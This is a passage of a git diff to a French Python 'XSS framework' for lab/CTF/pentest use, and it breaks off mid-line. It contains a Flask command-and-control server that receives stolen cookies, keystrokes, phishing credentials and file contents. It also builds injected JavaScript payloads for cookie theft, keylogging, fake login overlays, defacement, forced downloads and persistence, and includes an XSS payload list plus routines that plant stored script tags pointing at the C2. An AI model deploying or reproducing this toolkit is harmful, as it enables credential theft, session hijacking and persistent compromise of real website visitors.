@@ -2,9 +2,10 @@
 # -*- coding: utf-8 -*-
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║  XSS FRAMEWORK ULTIME - PERSISTANCE EDITION v1.0                 ║
+║  XSS FRAMEWORK ULTIME - PERSISTANCE EDITION v1.1                 ║
+║  Auteur : Jathniel                                               ║
 ║  Framework d'exploitation XSS pour labo/CTF/pentest autorisé     ║
-║  Kali Linux (WSL) — Python 3.12                                  ║
+║  Kali Linux (WSL) / Ubuntu — Python 3.12                         ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
@@ -17,20 +18,16 @@ import sqlite3
 import hashlib
 import threading
 import re
-import base64
+import socket
 import random
-import string
 from datetime import datetime, timezone
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
-from io import StringIO
+from urllib.parse import urljoin, urlparse, parse_qs, quote
 
 import requests
-import rich
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
-from rich.prompt import Prompt, Confirm
-from rich.text import Text
+from rich.prompt import Prompt
 from rich import box
 from flask import Flask, request, jsonify, Response, send_from_directory
 
@@ -39,17 +36,43 @@ from flask import Flask, request, jsonify, Response, send_from_directory
 # ═════════════════════════════════════════════════════════════════════
 
 CONSOLE = Console()
-DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xss_framework.db")
-C2_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_files")
-
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_FILE = os.path.join(BASE_DIR, "xss_framework.db")
+C2_DIR = os.path.join(BASE_DIR, "c2_files")
 os.makedirs(C2_DIR, exist_ok=True)
 
 C2_HOST = "0.0.0.0"
 C2_PORT = 8080
-C2_PUBLIC = "http://127.0.0.1:8080"
 
 TIMEOUT_HTTP = 10
 USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
+
+
+def get_local_ip():
+    """
+    Détecte automatiquement l'IP locale de la machine (WSL, Ubuntu, LAN).
+    Technique : ouvrir une socket UDP vers une IP externe (aucun paquet envoyé)
+    pour connaître l'interface réseau utilisée. Fallback sur 127.0.0.1.
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # Ne se connecte pas réellement — détermine juste l'interface de sortie
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    except OSError:
+        try:
+            # Fallback : résolution du hostname
+            ip = socket.gethostbyname(socket.gethostname())
+        except OSError:
+            ip = "127.0.0.1"
+    finally:
+        s.close()
+    return ip
+
+
+# IP détectée automatiquement au démarrage — le C2 utilise cette IP
+# pour que les victimes (même VM/machine distincte) puissent joindre le C2.
+C2_PUBLIC = f"http://{get_local_ip()}:{C2_PORT}"
 
 # ═════════════════════════════════════════════════════════════════════
 # BASE DE DONNÉES SQLITE
@@ -106,18 +129,19 @@ def db_insert_capture(cap_type, victim_ip, victim_ua, url, data, raw=""):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("INSERT INTO captures (type,victim_ip,victim_ua,url,data,raw,timestamp) VALUES (?,?,?,?,?,?,?)",
-              (cap_type, victim_ip, victim_ua, url, json.dumps(data) if isinstance(data, dict) else str(data),
+              (cap_type, victim_ip, victim_ua, url,
+               json.dumps(data, ensure_ascii=False) if isinstance(data, dict) else str(data),
                raw, datetime.now(timezone.utc).isoformat()))
     conn.commit()
     conn.close()
 
 
-def db_increment_execution(injection_id):
+def db_increment_execution(injection_db_id):
     """Incrémente le compteur d'exécution d'une injection"""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("UPDATE injections SET executions = executions + 1, last_seen = ? WHERE id = ?",
-              (datetime.now(timezone.utc).isoformat(), injection_id))
+              (datetime.now(timezone.utc).isoformat(), injection_db_id))
     conn.commit()
     conn.close()
 
@@ -130,14 +154,17 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = hashlib.sha256(os.urandom(32)).hexdigest()
 
 
+def _get_request_data():
+    """Unifie la lecture des données POST (JSON ou form) ou GET (query)"""
+    if request.method == "POST":
+        return request.get_json(silent=True) or dict(request.form)
+    return dict(request.args)
+
+
 @app.route("/collect/cookies", methods=["POST", "GET"])
 def collect_cookies():
     """Endpoint de collecte de cookies volés"""
-    data = {}
-    if request.method == "POST":
-        data = request.get_json(silent=True) or dict(request.form)
-    else:
-        data = dict(request.args)
+    data = _get_request_data()
     cookies_raw = data.get("cookies", "")
     url = data.get("url", "unknown")
     db_insert_capture("cookies", request.remote_addr, request.headers.get("User-Agent", ""),
@@ -149,11 +176,7 @@ def collect_cookies():
 @app.route("/collect/keys", methods=["POST", "GET"])
 def collect_keys():
     """Endpoint de collecte de frappes clavier"""
-    data = {}
-    if request.method == "POST":
-        data = request.get_json(silent=True) or dict(request.form)
-    else:
-        data = dict(request.args)
+    data = _get_request_data()
     keys = data.get("keys", "")
     url = data.get("url", "unknown")
     db_insert_capture("keylogger", request.remote_addr, request.headers.get("User-Agent", ""),
@@ -165,11 +188,7 @@ def collect_keys():
 @app.route("/collect/phish", methods=["POST", "GET"])
 def collect_phish():
     """Endpoint de collecte d'identifiants phishing"""
-    data = {}
-    if request.method == "POST":
-        data = request.get_json(silent=True) or dict(request.form)
-    else:
-        data = dict(request.args)
+    data = _get_request_data()
     db_insert_capture("phishing", request.remote_addr, request.headers.get("User-Agent", ""),
                       data.get("url", "unknown"), data)
     CONSOLE.print(f"\n[bold red][PHISH][/bold red] De [cyan]{request.remote_addr}[/cyan] — {json.dumps(data)[:80]}")
@@ -179,11 +198,7 @@ def collect_phish():
 @app.route("/collect/beacon", methods=["POST", "GET"])
 def collect_beacon():
     """Endpoint beacon — la victime signale sa présence"""
-    data = {}
-    if request.method == "POST":
-        data = request.get_json(silent=True) or dict(request.form)
-    else:
-        data = dict(request.args)
+    data = _get_request_data()
     db_insert_capture("beacon", request.remote_addr, request.headers.get("User-Agent", ""),
                       data.get("url", "unknown"), data)
     inj_id = data.get("inj_id")
@@ -197,14 +212,13 @@ def collect_beacon():
 
 @app.route("/collect/screen", methods=["POST", "GET"])
 def collect_screen():
-    """Endpoint de collecte d'infos navigateur"""
-    data = {}
-    if request.method == "POST":
-        data = request.get_json(silent=True) or dict(request.form)
-    else:
-        data = dict(request.args)
+    """Endpoint de collecte d'infos navigateur / fichiers fetchés"""
+    data = _get_request_data()
     db_insert_capture("beacon_info", request.remote_addr, request.headers.get("User-Agent", ""),
                       data.get("url", "unknown"), data)
+    if data.get("action") == "file_fetch":
+        CONSOLE.print(f"\n[bold red][FILE][/bold red] Contenu de [cyan]{data.get('target', '?')}[/cyan] reçu "
+                      f"({len(data.get('content', ''))} octets)")
     return jsonify({"status": "ok"})
 
 
@@ -212,7 +226,8 @@ def collect_screen():
 def serve_payload(injection_id):
     """Sert le payload JS pour une injection donnée"""
     payload_type = request.args.get("t", "beacon")
-    js = build_js_payload(payload_type, injection_id)
+    extra = request.args.get("extra", "")
+    js = build_js_payload(payload_type, injection_id, extra)
     return Response(js, mimetype="application/javascript")
 
 
@@ -220,8 +235,7 @@ def serve_payload(injection_id):
 def serve_download(filename):
     """Sert un fichier à télécharger par la victime"""
     safe = os.path.basename(filename)
-    path = os.path.join(C2_DIR, safe)
-    if os.path.isfile(path):
+    if os.path.isfile(os.path.join(C2_DIR, safe)):
         return send_from_directory(C2_DIR, safe, as_attachment=True)
     return jsonify({"error": "fichier introuvable"}), 404
 
@@ -265,10 +279,9 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
     elif payload_type == "cookies":
         return f"""
 (function() {{
-  var id = '{inj_id}';
   var img = new Image();
   img.src = '{c2}/collect/cookies?cookies=' + encodeURIComponent(document.cookie) +
-            '&url=' + encodeURIComponent(location.href) + '&inj_id=' + id;
+            '&url=' + encodeURIComponent(location.href) + '&inj_id=' + '{inj_id}';
   document.body.appendChild(img);
 }})();
 """
@@ -276,7 +289,6 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
     elif payload_type == "keylogger":
         return f"""
 (function() {{
-  var id = '{inj_id}';
   var buf = '';
   var timer = null;
   document.addEventListener('keypress', function(e) {{
@@ -293,7 +305,7 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
     fetch('{c2}/collect/keys', {{
       method: 'POST',
       headers: {{'Content-Type': 'application/json'}},
-      body: JSON.stringify({{keys: buf, url: location.href, inj_id: id}})
+      body: JSON.stringify({{keys: buf, url: location.href, inj_id: '{inj_id}'}})
     }}).catch(function(){{}});
     buf = '';
   }}
@@ -304,7 +316,6 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
     elif payload_type == "phishing":
         return f"""
 (function() {{
-  var id = '{inj_id}';
   var overlay = document.createElement('div');
   overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
     'background:rgba(0,0,0,0.9);z-index:999999;display:flex;' +
@@ -325,12 +336,8 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
     fetch('{c2}/collect/phish', {{
       method: 'POST',
       headers: {{'Content-Type': 'application/json'}},
-      body: JSON.stringify({{user: u, pass: p, url: location.href, inj_id: id}})
-    }}).then(function() {{
-      overlay.remove();
-    }}).catch(function() {{
-      overlay.remove();
-    }});
+      body: JSON.stringify({{user: u, pass: p, url: location.href, inj_id: '{inj_id}'}})
+    }}).then(function() {{ overlay.remove(); }}).catch(function() {{ overlay.remove(); }});
   }});
 }})();
 """
@@ -338,17 +345,16 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
     elif payload_type == "deface":
         return f"""
 (function() {{
-  var id = '{inj_id}';
   var banner = document.createElement('div');
   banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;z-index:999999;' +
     'background:linear-gradient(90deg,#ff0000,#ff6600);color:white;text-align:center;' +
     'padding:20px;font-size:24px;font-weight:bold;font-family:monospace;';
-  banner.innerHTML = '⚡ XSS PWNED ⚡ — Sécurité compromise — Framework XSS Ultime';
+  banner.innerHTML = 'XSS PWNED by JATHNIEL FRAMEWORK — Securite compromise';
   document.body.insertBefore(banner, document.body.firstChild);
   fetch('{c2}/collect/beacon', {{
     method: 'POST',
     headers: {{'Content-Type': 'application/json'}},
-    body: JSON.stringify({{inj_id: id, url: location.href, action: 'defaced'}})
+    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'defaced'}})
   }}).catch(function(){{}});
 }})();
 """
@@ -357,11 +363,10 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
         target = extra if extra else "https://example.com"
         return f"""
 (function() {{
-  var id = '{inj_id}';
   fetch('{c2}/collect/beacon', {{
     method: 'POST',
     headers: {{'Content-Type': 'application/json'}},
-    body: JSON.stringify({{inj_id: id, url: location.href, action: 'redirect_to_{target}'}})
+    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'redirect_to_{target}'}})
   }}).catch(function(){{}});
   setTimeout(function() {{ window.location.href = '{target}'; }}, 1500);
 }})();
@@ -371,11 +376,10 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
         fname = extra if extra else "payload.txt"
         return f"""
 (function() {{
-  var id = '{inj_id}';
   fetch('{c2}/collect/beacon', {{
     method: 'POST',
     headers: {{'Content-Type': 'application/json'}},
-    body: JSON.stringify({{inj_id: id, url: location.href, action: 'forced_download'}})
+    body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'forced_download'}})
   }}).catch(function(){{}});
   var a = document.createElement('a');
   a.href = '{c2}/download/{fname}';
@@ -389,14 +393,13 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
         target_url = extra if extra else ""
         return f"""
 (function() {{
-  var id = '{inj_id}';
   fetch('{target_url}')
     .then(function(r) {{ return r.text(); }})
     .then(function(content) {{
       return fetch('{c2}/collect/screen', {{
         method: 'POST',
         headers: {{'Content-Type': 'application/json'}},
-        body: JSON.stringify({{inj_id: id, url: location.href, action: 'file_fetch',
+        body: JSON.stringify({{inj_id: '{inj_id}', url: location.href, action: 'file_fetch',
                               target: '{target_url}', content: content.substring(0, 10000)}})
       }});
     }}).catch(function(){{}});
@@ -408,21 +411,11 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
 (function() {{
   var id = '{inj_id}';
   function persist() {{
-    // Cookie de persistance
     document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
-    // localStorage
     try {{ localStorage.setItem('xss_persist_' + id, '1'); }} catch(e) {{}}
-    // sessionStorage
     try {{ sessionStorage.setItem('xss_persist_' + id, '1'); }} catch(e) {{}}
-    // Service Worker cache
-    if ('caches' in window) {{
-      caches.open('xss_cache_' + id).then(function(c) {{
-        c.put('/xss_keepalive', new Response('1'));
-      }}).catch(function(){{}});
-    }}
   }}
   persist();
-  // Vérifie toutes les 60s que le cookie existe, le recrée si supprimé
   setInterval(function() {{
     if (document.cookie.indexOf('xss_sess_' + id) === -1) {{
       document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
@@ -433,7 +426,6 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
       }}).catch(function(){{}});
     }}
   }}, 60000);
-  // Beacon de vie
   setInterval(function() {{
     fetch('{c2}/collect/beacon', {{
       method: 'POST',
@@ -456,11 +448,8 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
       body: JSON.stringify(Object.assign({{inj_id: id}}, d))
     }}).catch(function(){{}});
   }}
-  // Beacon initial
   beacon({{url: location.href, action: 'loaded'}});
-  // Cookies
   beacon({{cookies: document.cookie}});
-  // Keylogger
   var buf = '';
   document.addEventListener('keypress', function(e) {{
     buf += String.fromCharCode(e.which || e.keyCode);
@@ -475,7 +464,6 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
       buf = '';
     }}
   }}, 10000);
-  // Persistance cookie
   document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
   setInterval(function() {{
     if (document.cookie.indexOf('xss_sess_' + id) === -1) {{
@@ -483,7 +471,6 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
       beacon({{action: 'repersisted'}});
     }}
   }}, 60000);
-  // Beacon périodique
   setInterval(function() {{ beacon({{action: 'alive'}}); }}, 30000);
 }})();
 """
@@ -496,101 +483,86 @@ def build_js_payload(payload_type, inj_id="0", extra=""):
 # ═════════════════════════════════════════════════════════════════════
 
 XSS_PAYLOADS = [
-    # Basiques
     "<script>alert(1)</script>",
     "<script>alert('XSS')</script>",
     "<script>confirm(1)</script>",
     "<script>prompt(1)</script>",
     "<script>alert(document.cookie)</script>",
     "<ScRiPt>alert(1)</ScRiPt>",
-    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
-    # Img
     "<img src=x onerror=alert(1)>",
     "<img src=x onerror=alert(document.cookie)>",
     "<img src=x onerror=confirm(1)>",
     "<img/src=x/onerror=alert(1)>",
-    "<img src=x:alert(1) onerror=eval(src)>",
     "<img src='x' onmouseover='alert(1)'>",
-    # SVG
     "<svg onload=alert(1)>",
     "<svg/onload=alert(1)>",
     "<svg><script>alert(1)</script></svg>",
     "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
-    "<svg><discard onbegin=alert(1)>",
-    # Iframe
     "<iframe src=javascript:alert(1)>",
     "<iframe srcdoc='<script>alert(1)</script>'>",
-    "<iframe src='javascript:alert(document.cookie)'></iframe>",
-    # Body/HTML
     "<body onload=alert(1)>",
     "<body onpageshow=alert(1)>",
-    "<body background='javascript:alert(1)'>",
-    "<div style='background:url(javascript:alert(1))'>",
     "<div onmouseover=alert(1)>hover</div>",
-    # Input/Form
     "<input onfocus=alert(1) autofocus>",
-    "<input type=text value='x' onfocus=alert(1) autofocus>",
     "<form><button formaction=javascript:alert(1)>click",
-    "<isindex type=image src=1 onerror=alert(1)>",
-    # Video/Audio
     "<video><source onerror=alert(1)>",
     "<audio src=x onerror=alert(1)>",
-    "<video onerror=alert(1)><source>",
-    # Marquee/Details
     "<marquee onstart=alert(1)>XSS</marquee>",
     "<details open ontoggle=alert(1)>",
-    "<details ontoggle=alert(1) open>xss</details>",
-    # Select/Textarea
     "<select onfocus=alert(1) autofocus>",
     "<textarea onfocus=alert(1) autofocus>",
     "<keygen autofocus onfocus=alert(1)>",
-    # Encoding / Bypass
     "%3Cscript%3Ealert(1)%3C/script%3E",
     "&#60;script&#62;alert(1)&#60;/script&#62;",
-    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
     "javascript:alert(1)",
     "JaVaScRiPt:alert(1)",
     "data:text/html,<script>alert(1)</script>",
-    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-    # Event handlers
     "onerror=alert(1)//",
     "'onmouseover='alert(1)'",
     "\"onfocus=\"alert(1)\" autofocus\"",
-    # Template/Expression
     "{{7*7}}",
     "${7*7}",
-    "<%= 7*7 %>",
-    "#{7*7}",
-    # Misc
     "<object data=javascript:alert(1)>",
     "<embed src=javascript:alert(1)>",
-    "<link rel=stylesheet href=javascript:alert(1)>",
     "<a href=javascript:alert(1)>click</a>",
     "<a href='javascript:alert(document.cookie)'>click</a>",
     "<base href=javascript:alert(1)//>",
-    "<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>-->",
-]
-
-PAYLOAD_SIGNATURES = [
-    ("alert(1)", "alert"),
-    ("alert('XSS')", "alert"),
-    ("confirm(1)", "confirm"),
-    ("prompt(1)", "prompt"),
-    ("document.cookie", "cookie"),
-    ("7*7", "template"),
-    ("49", "template_result"),
+    "<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>",
 ]
 
 
-def scan_reflected(url, method="GET", params=None, headers=None, cookies=None):
-    """Scanne une URL pour détecter des XSS réfléchis"""
-    results = []
+def parse_cookie_header(cookie_str):
+    """
+    Parse un header Cookie au format navigateur/curl :
+    'PHPSESSID=abc; security=low'  ->  dict
+    """
+    cookies = {}
+    cookie_str = cookie_str.strip()
+    if not cookie_str:
+        return cookies
+    for pair in cookie_str.split(";"):
+        pair = pair.strip()
+        if "=" in pair:
+            name, _, value = pair.partition("=")
+            cookies[name.strip()] = value.strip()
+    return cookies
+
+
+def build_session(cookies_str=None, headers=None):
+    """Construit une session requests avec UA + cookies optionnels"""
     session = requests.Session()
     session.headers.update({"User-Agent": USER_AGENT})
     if headers:
         session.headers.update(headers)
-    if cookies:
-        session.cookies.update(cookies)
+    if cookies_str:
+        session.cookies.update(parse_cookie_header(cookies_str))
+    return session
+
+
+def scan_reflected(url, method="GET", params=None, cookies_str=None):
+    """Scanne une URL pour détecter des XSS réfléchis"""
+    results = []
+    session = build_session(cookies_str)
 
     if params is None:
         parsed = urlparse(url)
@@ -602,22 +574,22 @@ def scan_reflected(url, method="GET", params=None, headers=None, cookies=None):
         params = {"q": "", "search": "", "id": "", "name": "", "input": "", "page": "",
                   "query": "", "keyword": "", "msg": "", "comment": "", "user": ""}
 
-    # Référence sans payload
+    # Référence sans payload (pour baseline)
     try:
         if method.upper() == "GET":
-            ref_resp = session.get(url, params=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
+            session.get(url, params=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
         else:
-            ref_resp = session.post(url, data=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
+            session.post(url, data=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
     except requests.RequestException as e:
         CONSOLE.print(f"[red]Erreur connexion : {e}[/red]")
         return results
 
     for param_name in params:
-        for payload in XSS_PAYLOADS[:30]:
-            test_params = dict(params)
+        for payload in XSS_PAYLOADS:
             marker = f"xssmark{random.randint(1000,9999)}"
             test_payload = payload.replace("alert(1)", f"alert('{marker}')")
-            test_payload = payload.replace("alert('XSS')", f"alert('{marker}')")
+            test_payload = test_payload.replace("alert('XSS')", f"alert('{marker}')")
+            test_params = dict(params)
             test_params[param_name] = test_payload
 
             try:
@@ -630,7 +602,6 @@ def scan_reflected(url, method="GET", params=None, headers=None, cookies=None):
 
             body = resp.text
 
-            # Détection : le payload est-il réfléchi tel quel ?
             if test_payload in body:
                 results.append({
                     "param": param_name,
@@ -640,9 +611,7 @@ def scan_reflected(url, method="GET", params=None, headers=None, cookies=None):
                     "url": url,
                     "status_code": resp.status_code,
                 })
-            # Détection : le marqueur apparaît dans un contexte script
             elif marker in body:
-                # Vérifie si le marqueur est dans un <script> ou attribut event
                 if re.search(rf'<script[^>]*>[^<]*{marker}', body, re.IGNORECASE) or \
                    re.search(rf'on\w+\s*=\s*["\']?[^"\']*{marker}', body, re.IGNORECASE):
                     results.append({
@@ -654,51 +623,46 @@ def scan_reflected(url, method="GET", params=None, headers=None, cookies=None):
                         "status_code": resp.status_code,
                     })
 
-            time.sleep(0.1)  # Rate limiting léger
+            time.sleep(0.05)
 
     return results
 
 
-def scan_stored(url, method="GET", params=None, headers=None, cookies=None, forms=None):
-    """Scanne pour XSS stocké — injecte puis vérifie si le payload persiste"""
+def scan_stored(url, forms, cookies_str=None):
+    """
+    Scanne pour XSS stocké : injecte un marqueur via les formulaires,
+    puis vérifie s'il persiste en rechargeant la page.
+    """
     results = []
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
-    if headers:
-        session.headers.update(headers)
-    if cookies:
-        session.cookies.update(cookies)
+    session = build_session(cookies_str)
 
     marker = f"xssstored{random.randint(10000,99999)}"
     test_payload = f"<script>alert('{marker}')</script>"
 
-    # Injection
-    if forms:
-        for form_info in forms:
-            inject_data = {}
-            for field in form_info.get("fields", []):
-                if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
-                    inject_data[field["name"]] = test_payload
-                elif field.get("type") == "submit":
-                    inject_data[field["name"]] = field.get("value", "submit")
-            if not inject_data:
-                continue
-            try:
-                resp = session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
-                # Vérifie la réflexion immédiate
-                if marker in resp.text:
-                    results.append({
-                        "param": str(list(inject_data.keys())),
-                        "payload": test_payload,
-                        "method": "POST(form)",
-                        "evidence": "réflexion après POST formulaire",
-                        "url": form_info["action"],
-                        "status_code": resp.status_code,
-                    })
-            except requests.RequestException as e:
-                CONSOLE.print(f"[yellow]Erreur formulaire {form_info['action']}: {e}[/yellow]")
+    for form_info in forms:
+        inject_data = {}
+        for field in form_info.get("fields", []):
+            if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
+                inject_data[field["name"]] = test_payload
+            elif field.get("type") == "submit":
+                inject_data[field["name"]] = field.get("value", "submit")
+        if not inject_data:
+            continue
+        try:
+            resp = session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
+            if marker in resp.text:
+                results.append({
+                    "param": str(list(inject_data.keys())),
+                    "payload": test_payload,
+                    "method": "POST(form)",
+                    "evidence": "réflexion après POST formulaire",
+                    "url": form_info["action"],
+                    "status_code": resp.status_code,
+                })
+        except requests.RequestException as e:
+            CONSOLE.print(f"[yellow]Erreur formulaire {form_info['action']}: {e}[/yellow]")
 
-    # Vérifie si le payload persiste en rechargeant la page
+    # Vérifie la persistance : recharge la page et cherche le marqueur
     try:
         resp = session.get(url, timeout=TIMEOUT_HTTP)
         if marker in resp.text:
@@ -706,7 +670,7 @@ def scan_stored(url, method="GET", params=None, headers=None, cookies=None, form
                 "param": "page",
                 "payload": test_payload,
                 "method": "GET",
-                "evidence": "payload persistant détecté",
+                "evidence": "payload persistant détecté (XSS stocké confirmé)",
                 "url": url,
                 "status_code": resp.status_code,
             })
@@ -719,8 +683,7 @@ def scan_stored(url, method="GET", params=None, headers=None, cookies=None, form
 def extract_forms(url, html):
     """Extrait les formulaires d'une page HTML"""
     forms = []
-    form_matches = re.finditer(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
-    for match in form_matches:
+    for match in re.finditer(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE):
         form_html = match.group(0)
         action_match = re.search(r'action=["\']?([^"\'>\s]*)', form_html, re.IGNORECASE)
         method_match = re.search(r'method=["\']?(\w+)', form_html, re.IGNORECASE)
@@ -731,8 +694,7 @@ def extract_forms(url, html):
             action = url
 
         fields = []
-        input_matches = re.finditer(r'<input[^>]*>', form_html, re.IGNORECASE)
-        for inp in input_matches:
+        for inp in re.finditer(r'<input[^>]*>', form_html, re.IGNORECASE):
             tag = inp.group(0)
             name_m = re.search(r'name=["\']?([^"\'>\s]+)', tag)
             type_m = re.search(r'type=["\']?([^"\'>\s]+)', tag)
@@ -744,11 +706,12 @@ def extract_forms(url, html):
                     "value": value_m.group(1) if value_m else ""
                 })
 
-        textarea_matches = re.finditer(r'<textarea[^>]*name=["\']?([^"\'>\s]+)', form_html, re.IGNORECASE)
-        for ta in textarea_matches:
+        for ta in re.finditer(r'<textarea[^>]*name=["\']?([^"\'>\s]+)', form_html, re.IGNORECASE):
             fields.append({"name": ta.group(1), "type": "textarea", "value": ""})
 
-        forms.append({"action": action, "method": (method_match.group(1) if method_match else "post").upper(), "fields": fields})
+        forms.append({"action": action,
+                      "method": (method_match.group(1) if method_match else "post").upper(),
+                      "fields": fields})
     return forms
 
 
@@ -756,46 +719,35 @@ def extract_forms(url, html):
 # MODULE EXPLOITATION
 # ═════════════════════════════════════════════════════════════════════
 
-def exploit_inject(url, param, method, payload_type, extra="", inj_id=None):
+def exploit_inject(url, param, method, payload_type, extra="", cookies_str=None):
     """
     Injecte un payload d'exploitation dans un paramètre vulnérable.
-    Retourne l'ID d'injection pour le tracking.
+    Le payload est un <script src> pointant vers le C2 : la victime qui
+    charge la page exécute le module choisi. Retourne (id_bdd, script_tag).
     """
-    if inj_id is None:
-        inj_id = str(uuid.uuid4())[:8]
+    session = build_session(cookies_str)
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
+    js_payload = build_js_payload(payload_type, "0", extra)
+    script_tag = f"<script src='{C2_PUBLIC}/payload/{{INJ}}?t={payload_type}'></script>"
 
-    js_payload = build_js_payload(payload_type, inj_id, extra)
-    # Encode le payload JS en <script src> si possible, sinon inline
-    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_id}?t={payload_type}'></script>"
-    inline_payload = f"<script>{js_payload}</script>"
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    clean_url = url.split("?")[0]
 
-    # On essaie le script externe d'abord (plus fiable pour la persistance)
-    for attempt_payload in [script_tag, inline_payload]:
-        parsed = urlparse(url)
-        qs = parse_qs(parsed.query)
-        clean_url = url.split("?")[0]
-
-        if method.upper() == "GET":
-            test_params = {k: v[0] for k, v in qs.items()}
-            test_params[param] = attempt_payload
-            try:
-                resp = session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
-                if attempt_payload in resp.text or "script" in resp.text.lower():
-                    break
-            except requests.RequestException:
-                continue
-        else:
-            test_data = dict(qs) if qs else {param: ""}
-            test_data[param] = attempt_payload
-            try:
-                resp = session.post(url, data=test_data, timeout=TIMEOUT_HTTP)
-                if attempt_payload in resp.text:
-                    break
-            except requests.RequestException:
-                continue
+    if method.upper() == "GET":
+        test_params = {k: v[0] for k, v in qs.items()} if qs else {}
+        test_params[param] = script_tag.replace("{INJ}", "probe")
+        try:
+            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
+        except requests.RequestException:
+            pass
+    else:
+        test_data = {k: v[0] for k, v in qs.items()} if qs else {}
+        test_data[param] = script_tag.replace("{INJ}", "probe")
+        try:
+            session.post(url, data=test_data, timeout=TIMEOUT_HTTP)
+        except requests.RequestException:
+            pass
 
     # Enregistre l'injection en base
     conn = sqlite3.connect(DB_FILE)
@@ -804,29 +756,40 @@ def exploit_inject(url, param, method, payload_type, extra="", inj_id=None):
                  VALUES (?,?,?,?,?,?,?)""",
               (url, param, payload_type, method.upper(), "exploit", "active",
                datetime.now(timezone.utc).isoformat()))
-    injection_id = c.lastrowid
+    injection_db_id = c.lastrowid
     conn.commit()
     conn.close()
 
-    return injection_id, script_tag
+    # Le script_tag réel utilise l'ID de base de données
+    # pour que le beacon incrémentale le compteur d'exécutions
+    final_tag = script_tag.replace("{INJ}", str(injection_db_id))
+    return injection_db_id, final_tag
 
 
-def exploit_stored(url, forms, payload_type, extra="", cookies=None):
-    """Injecte un payload XSS stocké via les formulaires d'une page"""
-    inj_id = str(uuid.uuid4())[:8]
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
-    if cookies:
-        session.cookies.update(cookies)
+def exploit_stored(url, forms, payload_type, extra="", cookies_str=None):
+    """
+    Injecte un payload XSS stocké via les formulaires d'une page.
+    Le payload persiste en base de données côté cible et s'exécute
+    pour tout visiteur de la page.
+    """
+    session = build_session(cookies_str)
 
-    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_id}?t={payload_type}'></script>"
+    # Placeholder remplacé après insertion en base
+    script_template = f"<script src='{C2_PUBLIC}/payload/{{INJ}}?t={payload_type}'"
+    if extra:
+        script_template += f"&extra={quote(extra)}"
+    script_template += "></script>"
+
+    # Injecte d'abord avec un ID temporaire pour connaître les formulaires qui passent
+    probe_tag = script_template.replace("{INJ}", "probe")
+    working_forms = []
     results = []
 
     for form_info in forms:
         inject_data = {}
         for field in form_info.get("fields", []):
             if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
-                inject_data[field["name"]] = script_tag
+                inject_data[field["name"]] = probe_tag
             elif field.get("type") == "submit":
                 inject_data[field["name"]] = field.get("value", "submit")
 
@@ -834,30 +797,51 @@ def exploit_stored(url, forms, payload_type, extra="", cookies=None):
             continue
 
         try:
-            resp = session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
-            if script_tag in resp.text:
-                results.append({"form": form_info["action"], "status": "injected + reflected"})
+            resp = session.post(form_info["action"], data=inject_data,
